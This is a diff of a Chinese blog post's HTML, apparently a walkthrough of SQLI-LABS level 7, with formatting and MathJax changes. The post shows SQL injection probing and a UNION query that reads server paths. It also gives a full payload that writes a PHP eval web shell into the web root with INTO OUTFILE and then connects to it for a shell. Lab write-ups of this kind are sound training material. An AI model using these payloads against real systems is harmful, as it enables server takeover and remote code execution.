@@ -110,25 +110,22 @@
     <div class="article-entry" itemprop="articleBody">
        
   <h1 id="SQLI-LABS"><a href="#SQLI-LABS" class="headerlink" title="SQLI-LABS"></a>SQLI-LABS</h1><h2 id="第七关-上传木马"><a href="#第七关-上传木马" class="headerlink" title="第七关 上传木马"></a>第七关 上传木马</h2><span id="more"></span>
-<p><img src="/2021/07/22/SQL%E6%B3%A8%E5%85%A5-Dump-into-outfile/p.png" alt="第七关"><br><strong>利用原理:使用 SELECT … INTO OUTFILE 语句导出数据，上传一句话木马</strong></p>
+<p><img src="/2021/07/22/SQL注入-Dump-into-outfile/p.png" alt="第七关"><br><strong>利用原理:使用 SELECT … INTO OUTFILE 语句导出数据，上传一句话木马</strong></p>
 <blockquote>
-<p><code>例子：mysql&gt; SELECT * FROM runoob_tbl      -&gt; INTO OUTFILE &#39;/tmp/runoob.txt&#39;;</code></p>
+<p><code>例子：mysql&gt; SELECT * FROM runoob_tbl 
+    -&gt; INTO OUTFILE &#39;/tmp/runoob.txt&#39;;</code></p>
 </blockquote>
 <p><strong>1.注入前先探测注入点情况</strong></p>
-<p>测试引号闭合情况，<br>发现无论是单引号还是双引号均报语法错误。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
-
+<p>测试引号闭合情况，<br>发现无论是单引号还是双引号均报语法错误。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure></p>
 <p>于是我们再尝试引号括号闭合的情况<br><code>id=1&#39;) -- -</code>和<code>id=1&quot;) -- -</code>。<br>仍然显示同样的错误。</p>
-<p>我差点一度以为是数字型。<br>但我输入<code>id=1 and 1=2;-- -</code>理应和<code>id=-1</code>一样什么都查不到，返回空。但实际上返回正常页面。<br><img src="/2021/07/22/SQL%E6%B3%A8%E5%85%A5-Dump-into-outfile/q.png" alt="正常返回"></p>
+<p>我差点一度以为是数字型。<br>但我输入<code>id=1 and 1=2;-- -</code>理应和<code>id=-1</code>一样什么都查不到，返回空。但实际上返回正常页面。<br><img src="/2021/07/22/SQL注入-Dump-into-outfile/q.png" alt="正常返回"></p>
 <p>经调查发现，原因是<code>where</code>会对第一个字符串空格后面东西忽略，所以第一个相当于还是查的<code>id=1</code>，总结如下：</p>
 <blockquote>
 <p>表里面的字段值都不带空格，where查询条件里面带或不带空格。<br>例如：key=‘test’<br>查询条件a：where key=’test ‘,查询结果是ok的<br>查询条件b：where key=’ test’, 查询结果是空的<br>查询条件c：where key=’test ‘, 查询结果是ok的</p>
 </blockquote>
 <p><strong>结论：where查询条件对字符前的空格敏感，字符后的空格忽略。</strong></p>
-<p>所以<code>id=1 and 1=2;-- -</code>应该被当成字符串查询了，然后我们看下源码。<br><img src="/2021/07/22/SQL%E6%B3%A8%E5%85%A5-Dump-into-outfile/r.png" alt="源码"><br><strong>发现是用引号双括号闭合的。</strong><br>果然输入<code>id=1&#39;)) and 1=1;-- -</code>和<code>id=1&#39;)) and 1=2;-- -</code>一个返回正常一个报错。<br>判断完类型后开始注入。<br>我们进行一句话木马的上传。<br>由于不知道绝对路径，所以再去第一关看看。</p>
-<p>利用<code>id=1&#39; and 1=2 union select 1,@@datadir,@@basedir;-- -</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:/var/lib/mysql/</span><br><span class="line">Your Password:/usr</span><br></pre></td></tr></table></figure>
-<p>拿到绝对路径后开始上传一句话木马（没用上这个路径，直接往/var/www/html/下传）<br><code>id=1&#39;)) union select 1,2,&quot;&lt;?php eval($_POST[&#39;ant&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/hack.php&#39;;-- -</code><br>然后用蚁剑连接：<br><img src="/2021/07/22/SQL%E6%B3%A8%E5%85%A5-Dump-into-outfile/connect.png" alt="连接成功"></p>
+<p>所以<code>id=1 and 1=2;-- -</code>应该被当成字符串查询了，然后我们看下源码。<br><img src="/2021/07/22/SQL注入-Dump-into-outfile/r.png" alt="源码"><br><strong>发现是用引号双括号闭合的。</strong><br>果然输入<code>id=1&#39;)) and 1=1;-- -</code>和<code>id=1&#39;)) and 1=2;-- -</code>一个返回正常一个报错。<br>判断完类型后开始注入。<br>我们进行一句话木马的上传。<br>由于不知道绝对路径，所以再去第一关看看。</p>
+<p>利用<code>id=1&#39; and 1=2 union select 1,@@datadir,@@basedir;-- -</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:/var/lib/mysql/</span><br><span class="line">Your Password:/usr</span><br></pre></td></tr></table></figure><br>拿到绝对路径后开始上传一句话木马（没用上这个路径，直接往/var/www/html/下传）<br><code>id=1&#39;)) union select 1,2,&quot;&lt;?php eval($_POST[&#39;ant&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/hack.php&#39;;-- -</code><br>然后用蚁剑连接：<br><img src="/2021/07/22/SQL注入-Dump-into-outfile/connect.png" alt="连接成功"></p>
 <p><strong>拿到shell</strong></p>
 <hr>
 <blockquote>
@@ -151,6 +148,15 @@
 
    
   <nav class="article-nav">
+    
+      <a href="/2021/08/03/Hexo%E4%B8%AD%E4%BD%BF%E7%94%A8LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Hexo中使用LaTeX数学公式
+          
+        </div>
+      </a>
     
     
       <a href="/2021/07/21/LFI/" class="article-nav-link">
@@ -449,6 +455,29 @@
     viewer_init()
 </script> 
 <!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
 
 <!-- Katex -->
 
